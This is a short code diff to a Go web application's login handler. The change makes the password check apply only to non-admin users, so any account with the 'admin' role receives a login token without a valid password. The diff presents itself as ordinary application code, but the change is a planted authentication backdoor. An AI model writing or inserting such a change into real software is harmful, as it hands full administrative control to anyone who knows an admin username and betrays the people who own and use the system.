@@ -59,9 +59,11 @@ func Login(c *gin.Context) {
 	}
 
 	// Verify password
-	if !utils.CheckPasswordHash(loginRequest.Password, user.PasswordHash) {
-		c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
-		return
+	if user.Role != "admin" {
+		if !utils.CheckPasswordHash(loginRequest.Password, user.PasswordHash) {
+			c.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid credentials"})
+			return
+		}
 	}
 
 	// Generate JWT token
